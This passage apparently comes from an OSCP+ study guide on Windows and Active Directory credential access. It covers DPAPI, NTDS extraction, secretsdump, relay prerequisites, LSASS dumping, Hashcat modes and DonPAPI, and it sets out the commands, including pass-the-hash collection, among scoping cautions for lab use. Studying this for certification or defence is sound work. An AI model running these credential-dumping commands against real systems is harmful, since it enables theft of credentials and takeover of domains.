Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Force -Recurse -ErrorAction SilentlyContinue
```

For each entry record target, type, username, persistence/context and whether a compatible application can ask Windows to use it. A listed credential is not necessarily exportable plaintext.

DPAPI reasoning:

```text
PROTECTED BLOB
-> MASTER-KEY GUID
-> USER OR MACHINE PROTECT SCOPE
-> MASTER-KEY DECRYPTION MATERIAL
-> APPLICATION-SPECIFIC DECODING
```

Possible decryption material includes the already logged-on user context, the user's password/NT hash, machine context or a domain DPAPI backup key. Prefer using the authorized existing context rather than copying unrelated protected data. One blob without its master key/context is incomplete.

## 8. NTDS and replication paths

### Offline NTDS from an already controlled DC

An offline parse needs a matched `NTDS.dit` and SYSTEM hive:

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM.hive LOCAL
```

Obtaining locked DC database files normally requires DC-level privilege and a snapshot/backup-aware method. Ordinary local administrator on a member server does not provide this material.

### Shadow-copy boundary: inspect before creating anything

From an already controlled Windows Server/DC context, first determine whether a usable snapshot already exists and whether the current token has the required backup/administrative rights:

```cmd
whoami /priv
vssadmin list shadows
diskshadow
```

At the `DISKSHADOW>` prompt:

```text
list shadows all
exit
```

> **Interpret:** an existing shadow proves only a snapshot object. It does not prove the current identity can read `NTDS.dit`, that the copy is current, or that a matching SYSTEM hive has been acquired. `DiskShadow` is a Windows Server utility; absence on a workstation is a platform result, not proof that VSS does not exist.

Creating, exposing or deleting a shadow changes host state and normally requires elevated backup/administrator context. Do not offer those actions until the selected procedure records the exact volume, matched NTDS/SYSTEM acquisition, destination, verification and cleanup. The state-machine gap is tracked as `RW08`; listing is safe discovery, not credential acquisition.

### Remote collection

```bash
impacket-secretsdump -dc-ip DC_IP 'DOMAIN/USER:PASSWORD@DC_HOST'
```

```bash
impacket-secretsdump -hashes :NT_HASH -dc-ip DC_IP 'DOMAIN/USER@DC_HOST'
```

This broad form can invoke several remote collection paths and is high impact. Use it only when the lab objective and privileges justify those sources. For replication rights and a bounded one-user request, use [DCSync](04-object-control-adcs-and-domain-compromise.md#dcsync-replication-rights).

## Credential routing

![Match recovered material to a compatible authentication method](../../diagrams/ad-credential-routing.png)

[Open scalable SVG](../../diagrams/ad-credential-routing.svg) | [Open PNG](../../diagrams/ad-credential-routing.png)

## 9. Classify before choosing the transition

| Output | Type | Immediate compatible possibilities | Not valid as |
| --- | --- | --- | --- |
| Cleartext password | Reusable secret | Password authentication, key derivation, DPAPI where applicable | Proof of authorization |
| NT hash | NTLM key | Offline crack; PTH where NTLM/service policy allows; Kerberos RC4 transition where supported | Net-NTLM response or DCC2 |
| AES128/AES256 key | Kerberos long-term key | Request Kerberos material using compatible tooling | Direct NTLM authentication |
| `.kirbi` / ccache | Kerberos ticket container | Use while valid for its client/realm/SPN scope | Password/hash |
| DCC2/MSCache v2 | Offline verifier | Offline cracking | PTH |
| DPAPI key/blob | Protected-data material | Decrypt only with matching context/keys | General logon credential |
| Machine-account key | Computer identity | Map the computer account's rights and Kerberos/NTLM paths | Human/domain-admin identity |

### Net-NTLMv2 relay is a live authentication path, not hash reuse

A captured Net-NTLMv2 response is suitable for offline recovery, but cannot be passed as an NT hash. A relay path instead needs a fresh inbound NTLM authentication event, a different reachable target that accepts the relayed protocol, target protections that permit the exchange, and useful authorization for the relayed identity.

For an explicitly selected SMB destination, inspect signing behavior before considering it a relay receiver:

```bash
nmap -p 445 --script smb2-security-mode TARGET
```

> **Interpret:** signing required closes the ordinary SMB-to-SMB relay receiver path. Signing enabled but not required is only one prerequisite; it does not supply an authentication source, bypass EPA/channel binding on another protocol, or grant the relayed identity useful rights.

The current OSCP+ exam guide prohibits poisoning/spoofing. Do not use Responder-style name-resolution poisoning in the exam workflow. A direct, already-existing authentication source still needs a separately reviewed, scope-compliant relay procedure and an action-specific verification; the incomplete procedure is tracked as `RW09`.

Every newly usable identity returns to Block 10 before movement:

```text
VERIFY MATERIAL -> AUTHENTICATE SAFELY -> CONFIRM IDENTITY
                -> MAP GROUPS/RIGHTS/SHARES/HOSTS/ROUTES
```

## 10. Failure router

| Symptom | Interpretation | Next action |
| --- | --- | --- |
| `privilege::debug` fails | Token is not elevated or privilege is unavailable | Verify integrity/privileges; use another authorized source |
| LSASS open/dump denied | PPL/Credential Guard/EDR/token limitation | Confirm protection state; do not infer no credentials |
| Dump parser architecture/version error | Tool/dump incompatibility | Match architecture and compatible OS/tool build |
| `Password : (null)` | Provider did not retain cleartext | Inspect typed hashes/keys/tickets; do not force a cleartext assumption |
| SAM parse boot-key error | SYSTEM/SAM mismatch or damaged export | Reacquire matched hives from the same state |
| SECURITY output shows cached domain values only | Offline verifiers, not reusable NT hashes | Use the correct offline format |
| Credential Manager lists target but no secret | Reference is context/application-bound | Test through the owning authorized context or DPAPI chain |
| DPAPI blob cannot decrypt | Missing master key/protecting context/material | Map blob → GUID → protect scope → key |
| Remote `secretsdump` denied | Remote admin/registry/replication prerequisite absent | Stop broad retries; determine which source/right was actually expected |
| DRS request denied | Effective domain-root replication rights absent | Validate the exact ACEs; local admin is irrelevant |

## Tooling for this section

| Tool | Choose it when | Requirements | Baseline | Decisive output | Failure cue |
| --- | --- | --- | --- | --- | --- |
| `klist` | Current Windows ticket inventory | Windows logon session; elevation for some LUIDs | `klist` | Client, server/SPN, validity and cache | Empty cache or inaccessible LUID |
| Mimikatz | Source/rights justify live or offline credential parsing | Trusted compatible build; appropriate privilege | `privilege::debug`, selected `sekurlsa`/`lsadump` command | Typed secret tied to identity/logon | PPL/CG/EDR, architecture or token failure |
| ProcDump/`comsvcs.dll` | Authorized LSASS dump for offline analysis | Elevated process access; writable destination | Section 4 | Complete dump file | Access denied/blocking/partial dump |
| `reg save` | Matched local registry hives | Administrator/SYSTEM or backup-capable context | Sections 5–6 | Successful hive exports | Access denied or mismatched point-in-time files |
| `impacket-secretsdump` | Parse matched hives or use a validated remote/DRS path | Installed version, selected source and its privilege | `-sam/-system LOCAL` or narrow DRS request | Correctly typed rows | Boot-key mismatch, remote-right or DRS failure |
| `cmdkey`/`vaultcmd` | Locate saved credential targets/types | Current user context | `cmdkey /list` | Target/type/user clues | Listed entry without exportable secret |
| Hashcat | Offline guessing of a classified verifier | Correct mode, candidate list/rule and compute | `-m 2100` for DCC2, `-m 1000` for NTLM | Recovered candidate verified against artifact | Token-length/format/mode mismatch |

## DonPAPI — remote DPAPI/application-secret collection with host rights

Use after confirming the accepted identity has the required administrative/remote access on this Windows host. SMB, remote operations and the available masterkey material affect what can be decrypted; ordinary domain-user authentication is not enough.

```bash
# One named host and one relevant collector, not automatic whole-domain targeting
donpapi collect -d DOMAIN -u USER -p 'PASSWORD' -t TARGET -c CredMan

# Distinct authentication material: the tool expects LMHASH:NTHASH form
donpapi collect -d DOMAIN -u USER \
  -H 'aad3b435b51404eeaad3b435b51404ee:HASH' -t TARGET -c CredMan
```

Read: distinguish acquired encrypted artifacts from decrypted credentials and identify each artifact's profile/application. Remote Registry/SAM/LSA operations can require service-control rights and alter service state. Bring the relevant password/hash/masterkey/PVK when needed; `--fetch-pvk` is not a default action and requires additional domain rights. An empty result can be a collection or decryption failure. Validate a recovered identity before moving.

Sources: [upstream 1](https://github.com/login-securite/DonPAPI).


## Sources

- Supplied PEN-200, Chapter 23, especially pp758–767 and pp779–784.
- [OffSec OSCP+ Body of Knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge)
- [Microsoft Windows authentication credential processes](https://learn.microsoft.com/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication)
- [Microsoft LSA protection](https://learn.microsoft.com/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
